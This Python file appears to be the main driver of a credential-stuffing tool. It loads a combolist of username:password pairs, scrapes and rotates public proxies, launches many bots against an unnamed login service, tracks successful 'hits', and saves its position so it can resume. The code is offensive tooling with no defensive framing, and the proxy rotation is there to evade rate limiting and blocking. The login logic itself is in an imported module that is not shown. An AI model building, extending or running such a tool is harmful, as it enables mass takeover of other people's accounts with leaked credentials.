from module.bruter import Bruter
from module.const import (combos_max, proxies_minimum)
from module.proxy_manager import ProxyManager
from module.proxy_scraper import ProxyScraper
from argparse import ArgumentParser
from asciimatics.screen import Screen
from collections import deque
from hashlib import md5
from sys import (path, platform)
from time import (sleep, time)


def create_combo_queue(input_combo_file, combos_start):
    queue = deque()  # ([username, password], ...)
    combo_count = 0

    with open(input_combo_file, 'r', encoding='utf-8', errors='ignore') as combo_file:
        for line in combo_file:
            if ':' in line:
                combo_count += 1

                if combo_count < combos_start:
                    continue

                if (combo_count - combos_start) > combos_max:
                    return queue

                combo = line.replace('\n', '').replace('\r', '').replace('\t', '')
                combo_parts = combo.split(':')
                queue.append([combo_parts[0], combo_parts[1]])

    return queue


def get_md5_hash(file_path):
    hash_md5 = md5()

    with open(file_path, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            hash_md5.update(chunk)

    return hash_md5.hexdigest()


def sessions_get(path_sessions_file):
    sessions = {}  # {combolist_hash: combolist_position, ...}

    try:
        sessions_file = open(path_sessions_file, 'r')
        sessions_lines = sessions_file.read().split('\n')
        sessions_file.close()
        
        for i in range(len(sessions_lines) - 1):
            session_parts = sessions_lines[i].split(':')
            sessions[session_parts[0]] = int(session_parts[1])

    except:
        pass
    
    return sessions               


def sessions_update(path_sessions_file, file_hash, combos_position):
    sessions = sessions_get(path_sessions_file)
    sessions[file_hash] = combos_position
    sessions_file = open(path_sessions_file, 'w+')

    for key in sessions:
        sessions_file.write(key + ':' + str(sessions[key]) + '\n')

    sessions_file.close()


def screen_clear(screen, lines):
    for i in range(lines):
        screen.print_at(' ' * 120, 0, i+1)


def main(screen):
    parser = ArgumentParser()
    parser.add_argument('combo_file', help='The path to your combolist', type=str)
    parser.add_argument('bots', help='How many bots you want to use', type=int)
    args = parser.parse_args()

    # generate file paths
    if 'linux' in platform or 'darwin' in platform:
        path_separator = '/'

    elif 'win' in platform:
        path_separator = '\\'

    else:
        path_separator = '/'

    path_proxy_sources_file = path[0] + path_separator + 'proxy_sources.txt'
    path_proxy_sources_log_file = path[0] + path_separator + 'proxy_sources_log.txt'
    path_proxy_last_run_file = path[0] + path_separator + 'proxies_last_run.txt'
    path_sessions_file = path[0] + path_separator + 'sessions'

    # get session (position) for combolist
    combo_file_hash = get_md5_hash(args.combo_file)
    sessions = sessions_get(path_sessions_file)

    if combo_file_hash in sessions:
        combos_start = sessions[combo_file_hash]

    else:
        combos_start = 0

    # create combo queue
    screen.print_at('Bruter Status:' + ' ' * 2 + 'Creating Combo Queue', 2, 1)
    screen.refresh()
    combo_queue = create_combo_queue(args.combo_file, combos_start)

    # initialize proxy scraper and scrape proxies
    screen_clear(screen, 1)
    screen.print_at('Bruter Status:' + ' ' * 2 + 'Scraping Proxies', 2, 1)
    screen.refresh()
    proxy_scraper = ProxyScraper(path_proxy_sources_file, path_proxy_sources_log_file)
    proxy_scraper.scrape()
    proxy_scraper_proxies = proxy_scraper.get()

    # loading proxies from last run
    screen_clear(screen, 1)
    screen.print_at('Bruter Status:' + ' ' * 2 + 'Loading Proxies from last run', 2, 1)
    screen.refresh()

    try:
        with open(path_proxy_last_run_file, 'r') as proxy_last_run_file:
            for line in proxy_last_run_file:
                if ':' in line:
                    proxy = line.replace('\n', '').replace('\r', '').replace('\t', '')

                    if proxy not in proxy_scraper_proxies:
                        proxy_scraper_proxies.append(proxy)
    except:
        pass

    # initialize proxy manager and feed it scraper's proxies
    screen_clear(screen, 1)
    screen.print_at('Bruter Status:' + ' ' * 2 + 'Adding Proxies', 2, 1)
    screen.refresh()
    proxy_manager = ProxyManager()
    proxy_manager.put(proxy_scraper_proxies)
    proxy_manager.start()

    del proxy_scraper_proxies  # save memory

    # initialize engine
    screen_clear(screen, 1)
    screen.print_at('Bruter Status:' + ' ' * 2 + 'Starting Bots', 2, 1)
    screen.refresh()
    engine = Bruter(args.bots, combo_queue, proxy_manager)
    engine.start()

    # initialize performance tracking variables
    tested_per_min = 0
    attempts_per_min = 0
    tested_before_last_min = 0
    attempts_before_last_min = 0
    tested_per_min_list = deque(maxlen=5)
    attempts_per_min_list = deque(maxlen=5)

    time_start = time()
    time_checked = time_start

    try:
        while len(combo_queue):
            time_now = time()
            time_running = time_now - time_start
            hours, rem = divmod(time_running, 3600)
            minutes, seconds = divmod(rem, 60)
            time_running_format = '{:0>2}:{:0>2}:{:05.2f}'.format(int(hours), int(minutes), seconds)

            screen_clear(screen, 16)
            screen.print_at('Bruter Status:' + ' ' * 9 + 'Running', 2, 1)
            screen.print_at('Time:' + ' ' * 18 + time_running_format, 2, 3)
            screen.print_at('Bots:' + ' ' * 18 + str(len(engine.bots)), 2, 4)
            screen.print_at('Hits:' + ' ' * 18 + str(engine.hits), 2, 5)
            screen.print_at('Combolist:' + ' ' * 13 + args.combo_file, 2, 7)
            screen.print_at('Combolist Position:' + ' ' * 4 + str(engine.tested + combos_start), 2, 8)
            screen.print_at('Loaded Combos:' + ' ' * 9 + str(len(combo_queue)), 2, 9)
            screen.print_at('Loaded Proxies:' + ' ' * 8 + str(proxy_manager.size), 2, 10)
            screen.print_at('Last Combo:' + ' ' * 12 + engine.last_combo[0] + ':' + engine.last_combo[1], 2, 11)
            screen.print_at('Tested:' + ' ' * 16 + str(engine.tested), 2, 13)
            screen.print_at('Attempts:' + ' ' * 14 + str(engine.tested + engine.retries), 2, 14)
            screen.print_at('Tested/min:' + ' ' * 12 + str(tested_per_min), 2, 15)
            screen.print_at('Attempts/min:' + ' ' * 10 + str(attempts_per_min), 2, 16)
            screen.refresh()

            # update tested/attempts /min
            if (time_now - time_checked) >= 60:
                time_checked = time_now
                tested_last_min = engine.tested - tested_before_last_min
                attempts_last_min = (engine.tested + engine.retries) - attempts_before_last_min
                tested_per_min_list.append(tested_last_min)
                attempts_per_min_list.append(attempts_last_min)
                tested_per_min = round(sum(tested_per_min_list) / len(tested_per_min_list), 2)
                attempts_per_min = round(sum(attempts_per_min_list) / len(attempts_per_min_list), 2)
                tested_before_last_min = engine.tested
                attempts_before_last_min = (engine.tested + engine.retries)

            # fetch new proxies if there are too few left
            if proxy_manager.size < proxies_minimum:
                screen_clear(screen, 1)
                screen.print_at('Bruter Status:' + ' ' * 9 + 'Scraping Proxies', 2, 1)
                screen.refresh()
                proxy_scraper.scrape()

                screen_clear(screen, 1)
                screen.print_at('Bruter Status:' + ' ' * 9 + 'Adding Proxies', 2, 1)
                screen.refresh()
                proxy_manager.put(proxy_scraper.get())

            sleep(0.25)

    except KeyboardInterrupt:
        pass

    # save proxies to file for next run
    proxies = proxy_manager.get_proxies()

    with open(path_proxy_last_run_file, 'w+') as proxy_last_run_file:
        for proxy in proxies:
            proxy_last_run_file.write(proxy + '\n')

    # update session with new combo position
    combos_position = (combos_start + engine.tested)
    sessions_update(path_sessions_file, combo_file_hash, combos_position)

    # stop script
    screen_clear(screen, 1)
    screen.print_at('Bruter Status:' + ' ' * 9 + 'Stopping', 2, 1)
    screen.refresh()
    engine.stop()
    proxy_manager.stop()


if __name__ == '__main__':
    Screen.wrapper(main)
    exit()
